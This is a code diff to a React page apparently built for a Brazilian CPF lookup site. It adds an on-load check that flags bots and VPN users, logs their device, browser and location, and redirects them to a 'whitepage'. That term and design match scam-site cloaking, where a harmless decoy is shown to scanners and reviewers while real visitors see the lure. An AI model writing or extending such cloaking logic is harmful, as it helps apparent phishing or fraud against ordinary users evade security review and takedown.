@@ -843,6 +843,48 @@ export default function ConsultaPage() {
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState('')
   const [pendingData, setPendingData] = useState(null)
+  const [accessInfo, setAccessInfo] = useState(null)
+
+  // Verificar proteção anti-bot/VPN no carregamento
+  useEffect(() => {
+    async function verificarAcesso() {
+      try {
+        const res = await fetch('/api/verificar-acesso', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' }
+        })
+        if (res.ok) {
+          const data = await res.json()
+          setAccessInfo(data)
+          if (!data.allowed) {
+            // Registrar acesso bloqueado
+            const deviceInfo = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+            const browserInfo = navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)/)?.[0] || 'Desconhecido'
+            fetch('/api/acesso', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                cpf_consultado: '',
+                dispositivo: deviceInfo,
+                navegador: browserInfo,
+                bloqueado: true,
+                motivo_bloqueio: data.reason,
+                is_vpn: data.reason === 'vpn',
+                is_bot: data.reason === 'bot',
+                pais: data.ipInfo?.country || '',
+                cidade: data.ipInfo?.city || ''
+              })
+            }).catch(() => {})
+            // Redirecionar para whitepage
+            window.location.href = data.redirect
+          }
+        }
+      } catch (err) {
+        console.log('Erro na verificação:', err)
+      }
+    }
+    verificarAcesso()
+  }, [])
 
   const handleLoadingComplete = useCallback(() => {
     if (pendingData) {
